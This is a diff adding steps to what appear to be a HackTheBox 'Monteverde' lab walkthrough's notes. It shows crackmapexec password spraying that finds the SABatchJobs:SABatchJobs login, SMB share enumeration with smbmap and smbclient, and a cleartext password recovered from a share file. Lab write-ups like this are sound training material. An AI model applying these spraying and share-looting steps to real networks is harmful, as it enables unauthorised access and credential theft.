@@ -59,3 +59,34 @@ Valid Users
 |dgalanos@MEGABANK|
 |svc-ata@MEGABANK|
 ```
+
+
+```
+crackmapexec smb 10.10.10.172 -u ~root/HackTheBox/Monterverde/password.txt -p ~root/HackTheBox/Monterverde/password.txt 
+```
+
+```
+MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+```
+![[Pasted image 20240503175616.png]]
+
+
+Let's check SMB access
+```
+crackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares
+```
+
+```
+smbmap -u SABatchJobs -d MEGABANK.LOCAL -p 'SABatchJobs' -H 10.10.10.172
+```
+![[Pasted image 20240503180348.png]]
+
+```
+smbclient //10.10.10.172/users$ -U 'SABatchJobs' --password 'SABatchJobs'
+```
+![[Pasted image 20240503180623.png]]
+
+When we open the file 
+```
+4n0therD4y@n0th3r$
+```
